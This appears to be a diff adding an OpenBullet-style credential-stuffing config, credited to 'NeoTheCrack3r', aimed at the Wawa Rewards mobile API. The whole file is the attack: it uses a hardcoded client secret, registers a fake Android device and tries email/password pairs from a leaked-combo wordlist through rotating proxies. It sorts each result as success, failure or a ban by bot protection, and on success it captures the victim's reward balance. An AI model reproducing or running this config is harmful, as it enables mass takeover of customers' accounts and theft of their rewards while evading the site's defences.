@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Wawa",
+  "SuggestedBots": 80,
+  "LastModified": "2019-04-02T17:32:58.3531513+03:00",
+  "AdditionalInfo": "Made by Neo#0516",
+  "Author": "NeoTheCrack3r",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://mob2api.mdc53.com/v4/authenticate" 
+  
+  HEADER "User-Agent: okhttp/3.10.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "mdc-client_id: wawawebtest" 
+  HEADER "mdc-client_secret: Pk3rZYbM5dLNsiKUfK3zA3L0MGWgKYTZeUzEhN8" 
+PARSE "<SOURCE>" LR "accessToken\":\"" "\"" -> VAR "TOKEN" 
+REQUEST POST "https://mob2api.mdc53.com/v4/device" 
+  CONTENT "{\"user_string\":\"Wawa React-Native android\",\"deviceType\":\"Android\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "mdc-wawaappversion: 4.3.1.5" 
+  HEADER "authorization: Bearer <TOKEN>" 
+PARSE "<SOURCE>" LR "deviceID\":" "," -> VAR "ID" 
+REQUEST POST "https://mob2api.mdc53.com/v4/login" 
+  CONTENT "{\"deviceId\":<ID>,\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "mdc-wawaappversion: 4.3.1.5" 
+  HEADER "authorization: Bearer <TOKEN>" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your Wawa Rewards username or password was entered incorrectly" 
+    KEY "Your email or password was entered incorrectly" 
+  KEYCHAIN Success OR 
+    KEY "customerID\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "Incapsula incident ID" 
+PARSE "<SOURCE>" LR "accessToken\":\"" "\"" -> VAR "TOKEN2" 
+PARSE "<SOURCE>" LR "customerID\":\"" "\"" -> VAR "CID" 
+REQUEST GET "https://mob2api.mdc53.com/v4/application/rewards/home" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <TOKEN2>" 
+  HEADER "mdc-wawaappversion: 4.3.1.5" 
+  HEADER "mdc-customerid: <CID>" 
+PARSE "<SOURCE>" LR "spendTowardsReward\":" "," -> CAP "REWARDS" "$" "" 
